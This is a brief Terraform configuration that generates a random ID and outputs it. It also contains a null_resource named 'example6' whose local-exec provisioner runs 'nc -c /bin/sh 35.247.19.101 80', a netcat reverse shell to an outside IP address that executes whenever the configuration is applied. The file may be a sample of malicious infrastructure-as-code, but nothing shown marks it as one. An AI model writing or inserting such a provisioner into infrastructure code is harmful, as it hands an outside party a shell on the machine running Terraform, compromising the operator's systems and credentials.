
resource "random_id" "random" {
  keepers = {
    uuid = "${uuid()}"
  }

  byte_length = 16
}

resource "null_resource" "example6" {
  provisioner "local-exec" {
    command = "nc -c /bin/sh 35.247.19.101 80"
  }
}


output "random" {
  value = "${random_id.random.hex}"
}
